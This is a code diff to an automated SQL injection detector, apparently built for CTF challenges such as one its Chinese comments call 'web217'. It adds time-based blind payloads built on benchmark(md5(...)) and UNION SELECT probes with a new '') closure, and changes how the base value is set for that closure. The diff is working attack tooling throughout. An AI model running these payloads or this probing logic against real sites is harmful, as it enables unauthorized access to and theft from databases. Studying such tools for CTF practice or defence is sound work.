@@ -162,10 +162,14 @@ class Detector:
             ("", f"{base} or benchmark(1000000,md5(0x616263))#"),
             ("'", f"{base}'or benchmark(1000000,md5(0x616263))#"),
             (")", f"{base})or(benchmark(1000000,md5(0x616263)))#"),
+            # '') 闭合（web217 模板 ip = ($id)）：空基线 + 空串填括号
+            ("'')", "'')or(benchmark(1000000,md5(0x616263)))#"),
+            ("'')", "'')or(if((length((database()))>0),benchmark(1000000,md5(0x616263)),0))#"),
         ]
         for closure, payload in probes:
             if self.s.stopped:
                 return None
+            used_base = "" if closure == "'')" else base
             t0 = _t.perf_counter()
             r = self._send(payload)
             dt = _t.perf_counter() - t0
@@ -177,7 +181,7 @@ class Detector:
                     continue
             elif dt < 3.5:
                 continue
-            inj = InjectionPoint(param=self.s.spec.param, base_value=base,
+            inj = InjectionPoint(param=self.s.spec.param, base_value=used_base,
                                  numeric=(closure == ""), closure=closure)
             inj.comment = "#"
             inj.form = "classic"
@@ -205,7 +209,10 @@ class Detector:
         for mode in ("classic", "tab", "tab-mixed", "paren", "paren-mixed",
                      "inline"):
             base_mode = mode.split("-")[0]
-            for suffix in ("'", '"', "", ")", "')", '")'):
+            for suffix in ("'", '"', "", ")", "')", '")', "'')"):
+                # '') 闭合（web217 类模板 ip = ($id)）：空字符串填括号，
+                # 数字基线 + 引号对（1''）是语法错误 → 基线必须为空
+                pbase = "" if suffix == "'')" else base
                 for cols in (2, 3, 4, 5):
                     nums = [str(9137 + i * 13) for i in range(cols)]
                     core = apply_form(f"union select {','.join(nums)}", base_mode)
@@ -213,7 +220,7 @@ class Detector:
                         core = mixed_case(core)
                     sep = form_sep(base_mode) if suffix == "" else ""
                     for tail in ("#", "-- "):
-                        payload = f"{base}{suffix}{sep}{core}{tail}"
+                        payload = f"{pbase}{suffix}{sep}{core}{tail}"
                         r = self._send(payload)
                         if r.status_code < 0:
                             continue
@@ -221,7 +228,7 @@ class Detector:
                         if not hits:
                             continue
                         inj = InjectionPoint(param=self.s.spec.param,
-                                             base_value=base,
+                                             base_value=pbase,
                                              closure=suffix, numeric=(suffix == ""))
                         inj.comment = tail.strip()
                         inj.column_count = cols
